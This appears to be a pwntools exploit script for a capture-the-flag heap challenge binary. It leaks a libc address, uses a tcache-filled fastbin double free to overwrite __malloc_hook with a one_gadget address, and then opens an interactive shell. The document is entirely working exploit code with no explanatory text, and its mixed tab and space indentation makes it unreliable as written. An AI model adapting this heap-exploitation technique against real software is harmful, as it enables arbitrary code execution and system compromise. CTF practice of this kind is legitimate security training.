from pwn import *
context.log_level = 'debug'

p = process("./chall")
#p = process("./pwn")
#libc = ELF("./lib/libc.so.6")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
one_gadget = 0xe237f
def Add(size,name,call):
	p.recvuntil("choice:")
	p.sendline("1")
	p.recvuntil("Please input the size of girl's name")
	p.sendline(str(size))
	p.recvuntil("please inpute her name:")
	p.sendline(name)
	p.recvuntil("please input her call:")
	p.sendline(call)

def Show(idx):
	p.recvuntil("choice:")
	p.sendline("2")
	p.recvuntil("Please input the index:")
	p.sendline(str(idx))
        
def Edit():
	p.recvuntil("choice:")
	p.sendline("3")

def Call(idx):
	p.recvuntil("choice:")
	p.sendline("4")
	p.recvuntil("Please input the index:")
	p.sendline(str(idx))
	
if __name__=='__main__':
	call = '1'*0xb
	name = 'A'*0x8
	Add(0x500,name,call)
	Add(0x500,name,call)
        Call(0)
        Show(0)  #leak libc_addr 

        p.recvuntil("name:\n")
        leak_addr = u64(p.recv(6).ljust(8,'\x00'))
        print "leak_addr:",hex(leak_addr)
        libc_base = leak_addr - 96-0x10-libc.symbols['__malloc_hook']
        print "libc_base:",hex(libc_base)
	Add(0x500,name,call) #2
        for i in range(3,12):
	    Add(0x60,name,call) #3-11

        for i in range(3,10):
            Call(i)

        Call(10)
        Call(11)
        Call(10) #double free fastbin
        for i in range(0,7):
            Add(0x60,name,call)

        addr = leak_addr-96-0x33
        print "addr:",hex(addr) 
        Add(0x60,p64(addr),call)
        Add(0x60,name,call)
        Add(0x60,name,call)
        one_gadget = one_gadget + libc_base
        Add(0x60,'A'*0x23+p64(one_gadget),call)
        #gdb.attach(p)
        
	p.interactive()
